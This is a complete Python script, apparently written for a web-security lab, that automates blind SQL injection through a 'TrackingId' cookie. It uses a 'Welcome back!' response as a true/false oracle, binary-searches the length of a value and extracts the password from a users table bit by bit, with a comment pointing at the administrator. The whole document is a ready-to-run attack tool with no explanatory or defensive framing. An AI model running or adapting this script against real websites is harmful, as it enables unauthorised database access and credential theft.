#!/usr/bin/python3
import json,sys,requests,time
from urllib.parse import quote_plus

url = sys.argv[1]
session = requests.Session()

def oracle(query):
    payload = quote_plus(f"' OR ({query})--")
    cookies = {
        "TrackingId": payload
    }
    r = requests.get(url,cookies=cookies)
    #print(request.data)
    #print(r.text)
    #j = json.loads(r.text)
    #return j['status'] == 'taken'
    return 'Welcome back!' in r.text 

# confirm oracle can run correct
"""
assert oracle("1=1")
assert not oracle("1=0")
"""

# Calculate the Length or Count
def dump_integer(query):
    low = 0
    high = 127
    while low <= high:
        mid = (low+high) // 2
        if oracle(f"LENGTH(({query}))/**/BETWEEN/**/{low}/**/AND/**/{mid}"):
            high = mid -1
        else:
            low = mid + 1
    return low

def dump_string(query, length):
    var = ""
    for i in range(1,length+1):  
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({query}),{i},1))%26{2**p}>0"):
                c |= 2**p
        var += chr(c)
        print(var)
    return var

table = "users" # change this
column = "password" # change this
payload = f"SELECT {column} FROM {table} LIMIT 1 OFFSET 0"  # or WHERE username = 'administrator'
length = dump_integer(payload)
admin_password = dump_string(payload,int(length))
